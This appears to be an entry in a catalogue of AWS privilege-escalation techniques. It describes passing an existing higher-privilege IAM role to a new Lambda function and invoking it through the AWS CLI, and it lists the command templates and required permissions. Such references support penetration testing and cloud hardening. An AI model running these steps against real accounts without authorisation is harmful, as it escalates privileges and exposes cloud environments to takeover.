---
description: |
    This escalation attaches an existing lambda role to a newly created lambda and then invokes the lambda using the AWS CLI.

    The command accepts a file containing python code for the lambda to execute. This should be used to execute higher privileged commands within the environment.

    There are many methods that can be used to trigger a lambda, the example code section is based off of the use of **lambda:InvokeFunction**. The permissions for the other methods are listed within the required privileges section. **lambda:CreateEventSourceMapping** requires additional permissions for the mapped resource to trigger the event that will in turn trigger the lambda.
details:
    AWS-CLI-command:
        - code: |
            aws lambda create-function --function-name {function name} --runtime python3.9 --role {lambda role} --handler lambda_function.{function} --code file://{path to python code}
            aws lambda invoke --function-name {function name} output.txt
    required-privileges:
        - code: |
            iam:PassRole
            AND
            lambda:InvokeFunction
            OR
            lambda:CreateFunctionUrlConfig
            OR
            lambda:CreateEventSourceMapping
    required-configurations:
        - code: |
            An existing higher privilege lambda role.
    useful-privileges:
        - code: |
            iam:ListRoles
            iam:ListAttachedRolePolicies
            iam:GetPolicy
    sources:
        - code: |
            https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
    submitted-by:
        - code: |
            Lucas Fedyniak-Hopes
---